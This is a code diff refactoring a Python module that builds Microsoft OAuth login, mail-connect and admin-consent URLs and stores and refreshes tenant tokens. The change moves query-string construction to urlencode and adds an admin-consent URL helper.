@@ -1,7 +1,7 @@
 import requests
 import os
-from datetime import datetime, timedelta
-from urllib.parse import quote_plus, unquote
+from datetime import datetime
+from urllib.parse import urlencode, quote_plus, unquote
 
 from models import TenantToken
 from db import SessionLocal
@@ -33,7 +33,7 @@ def send_telegram_alert(message):
         print("Telegram error:", e)
 
 # =========================
-# GENERATE LOGIN LINKS
+# URL GENERATORS
 # =========================
 def generate_login_link(user_id, session_id=None):
     state = f"{user_id}:{session_id}" if session_id else user_id
@@ -47,8 +47,8 @@ def generate_login_link(user_id, session_id=None):
         "state": quote_plus(state),
     }
 
-    query = "&".join([f"{k}={v}" for k, v in params.items()])
-    return f"{AUTH_URL}?{query}"
+    return f"{AUTH_URL}?{urlencode(params)}"
+
 
 def generate_mail_connect_link(user_id, session_id=None):
     state = f"{user_id}:{session_id}" if session_id else user_id
@@ -62,8 +62,8 @@ def generate_mail_connect_link(user_id, session_id=None):
         "state": quote_plus(state),
     }
 
-    query = "&".join([f"{k}={v}" for k, v in params.items()])
-    return f"{AUTH_URL}?{query}"
+    return f"{AUTH_URL}?{urlencode(params)}"
+
 
 def generate_org_connect_link():
     params = {
@@ -75,8 +75,8 @@ def generate_org_connect_link():
         "prompt": "admin_consent",
     }
 
-    query = "&".join([f"{k}={v}" for k, v in params.items()])
-    return f"{AUTH_URL}?{query}"
+    return f"{AUTH_URL}?{urlencode(params)}"
+
 
 def generate_org_mail_connect_link():
     params = {
@@ -88,11 +88,22 @@ def generate_org_mail_connect_link():
         "prompt": "admin_consent",
     }
 
-    query = "&".join([f"{k}={v}" for k, v in params.items()])
-    return f"{AUTH_URL}?{query}"
+    return f"{AUTH_URL}?{urlencode(params)}"
+
+
+def generate_admin_consent_url(tenant: str | None = None):
+    tenant_value = tenant or "organizations"
+
+    params = {
+        "client_id": CLIENT_ID,
+        "redirect_uri": REDIRECT_URI,
+    }
+
+    return f"https://login.microsoftonline.com/{tenant_value}/adminconsent?{urlencode(params)}"
+
 
 # =========================
-# SAVE TOKEN
+# TOKEN STORAGE
 # =========================
 def save_token(user_id, access_token, refresh_token, expires_in):
     db = SessionLocal()
@@ -119,9 +130,7 @@ def save_token(user_id, access_token, refresh_token, expires_in):
     db.commit()
     db.close()
 
-# =========================
-# GET TOKEN
-# =========================
+
 def get_token(user_id):
     db = SessionLocal()
     token = db.query(TenantToken).filter(
@@ -130,8 +139,9 @@ def get_token(user_id):
     db.close()
     return token
 
+
 # =========================
-# REFRESH TOKEN
+# TOKEN REFRESH
 # =========================
 def refresh_token(user_id):
     token_record = get_token(user_id)
@@ -163,8 +173,9 @@ def refresh_token(user_id):
 
     return result
 
+
 # =========================
-# EXCHANGE CODE
+# CODE EXCHANGE
 # =========================
 def exchange_code(code):
     data = {
